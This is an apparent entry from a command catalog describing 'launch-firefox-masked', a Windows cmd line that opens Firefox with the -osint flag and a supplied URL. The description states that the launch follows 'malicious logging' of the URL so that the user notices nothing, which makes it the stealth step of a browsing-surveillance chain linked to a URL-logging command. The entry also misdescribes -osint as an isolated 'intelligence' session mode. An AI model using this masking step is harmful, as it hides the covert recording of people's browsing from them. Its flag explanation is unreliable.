---
id: c4b2c3d4-e5f6-7890-abcd-ef1234567897
name: launch-firefox-masked
type: command
executor: cmd
data: '"C:\Program Files (x86)\Mozilla Firefox\firefox.exe" -osint -url "%1"'
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:19.836Z'
platforms:
  - Windows
tags:
  - browser
verified: false
validated: true
submitted: true
---

# launch-firefox-masked

## Command

```cmd
"C:\Program Files (x86)\Mozilla Firefox\firefox.exe" -osint -url "%1"
```

## Description

Launches Firefox with the provided URL using -osint flag (one-time session/intelligence mode) to perform the expected browser action after malicious logging, avoiding suspicion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -osint | Opens in isolated session | Yes |
| -url "%1" | Navigates to the passed URL | Yes |

## Examples

### Basic Usage

```cmd
"C:\Program Files (x86)\Mozilla Firefox\firefox.exe" -osint -url "https://example.com"
```

### Advanced Usage

```cmd
start "" "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" -osint -url "%1"
```

## Expected Output

Firefox launches and navigates to the URL without errors.

## Related

- [[commands/log-url-to-file]]
